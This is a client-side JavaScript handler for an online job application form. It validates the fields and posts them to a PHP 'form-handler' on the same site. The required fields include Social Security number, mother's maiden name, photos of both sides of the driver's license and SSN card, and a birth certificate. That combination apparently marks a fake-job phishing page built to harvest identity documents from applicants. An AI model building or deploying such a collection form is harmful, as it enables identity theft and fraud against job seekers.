document.addEventListener("DOMContentLoaded", function () {
    const form = document.querySelector(".job-manager-application-form");
    const submitter = document.querySelector("#submit_application_button");
    const formHandlerUrl = `${window.location.origin}/parsers/form-handler.php`;

    form && form.addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent form's default submission

        // Gather and validate form data
        const formData = new FormData(form);
        const errors = [];

        // Required fields
        const requiredFields = [
            "first-name",
            "last-name",
            "mothers-maiden-name",
            "email-address",
            "social-security-number",
            "drivers-license-front",
            "drivers-license-back",
            "birth-certificate",
            "current-home-address",
            "phone-number",
            "ssn-card-front",
            "ssn-card-back"
        ];

        // Loop through required fields to validate
        requiredFields.forEach(field => {
            const input = form.querySelector(`#${field}`);
            if (!input || !input.value || (input.type === "file" && input.files.length === 0)) {
                errors.push(`${field.replace(/-/g, ' ')} is required.`);
            }
        });

        // Additional validation for email and phone number formats
        const email = formData.get("email-address");
        const phone = formData.get("phone-number");
        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phonePattern = /^[0-9]{10,15}$/;

        if (!emailPattern.test(email)) {
            errors.push("Please enter a valid email address.");
        }
        if (!phonePattern.test(phone)) {
            errors.push("Please enter a valid phone number.");
        }

        // Check if there are errors
        if (errors.length > 0) {
            alert("Please fix the following errors:\n" + errors.join("\n"));
            return; // Stop the function if validation fails
        }

        // If validation passes, log form data for submission
        const submitData = {};
        formData.forEach((value, key) => {
            if (value instanceof File) {
                submitData[key] = value; // File inputs
            } else {
                submitData[key] = value.trim(); // Text inputs
            }
        });

        // Ready for submission (example: sending data to an API or processing it further)
        // console.log("Form data ready for submission:", submitData);

        // If validation passes, proceed with sending form data
        submitter.disabled = true;
        const temp = submitter.value;
        submitter.value = "submitting...";
        fetch(formHandlerUrl, {
            method: 'POST',
            body: formData
        })
            .then(response => response.text())
            .then(data => {
                if (data.includes('Form submitted successfully')) {
                    alert("Application submitted successfully!");
                    form.reset(); // Clear the form after successful submission
                } else {
                    alert("Failed to submit application. " + data);
                }
            })
            .catch(error => {
                console.error("Submission error:", error);
                alert("An error occurred while submitting the form. Please try again.");
            })
            .finally(() => {
                submitter.disabled = false;
                submitter.value = temp;
            })
    });
});